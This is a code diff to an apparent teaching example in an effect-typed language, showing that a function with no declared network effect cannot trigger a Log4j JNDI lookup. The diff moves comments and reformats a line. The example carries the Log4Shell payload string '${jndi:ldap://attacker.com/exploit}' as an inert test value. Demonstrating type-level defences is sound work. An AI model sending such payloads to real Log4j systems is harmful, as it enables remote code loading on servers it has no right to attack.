@@ -9,7 +9,6 @@
 // Real-world impact: Log4j evaluated ${jndi:ldap://attacker.com/...} inside
 // a log statement. A pure logging formatter with no Net effect cannot trigger
 // JNDI lookups by construction — not policy, not runtime check, but type.
-
 type ParsedInput = struct {
     value: String,
     is_valid: Bool,
@@ -17,8 +16,6 @@ type ParsedInput = struct {
 
 // Pure function: no effects declared — cannot make network calls, period
 total fn parse_input(raw: String) -> ParsedInput {
-    // Even if raw contains "${jndi:ldap://attacker.com/exploit}",
-    // this function cannot evaluate or dispatch it — no Net effect.
     if raw.len() == 0 {
         ParsedInput { value: "", is_valid: false }
     } else {
@@ -26,17 +23,19 @@ total fn parse_input(raw: String) -> ParsedInput {
     }
 }
 
+// Even if raw contains "${jndi:ldap://attacker.com/exploit}",
+// this function cannot evaluate or dispatch it — no Net effect.
 // Only functions that declare ! Console can write output
 fn log_result(input: ParsedInput) -> Unit ! Console {
     match input.is_valid {
-        true  => println("parsed ok"),
+        true => println("parsed ok"),
         false => println("empty input rejected"),
     }
 }
 
 fn main() -> Unit ! Console {
-    // The Log4Shell attack payload — inert here because parse_input has no effects
     let attack: String = "${jndi:ldap://attacker.com/exploit}";
     let parsed: ParsedInput = parse_input(attack);
     log_result(parsed)
 }
+// The Log4Shell attack payload — inert here because parse_input has no effects
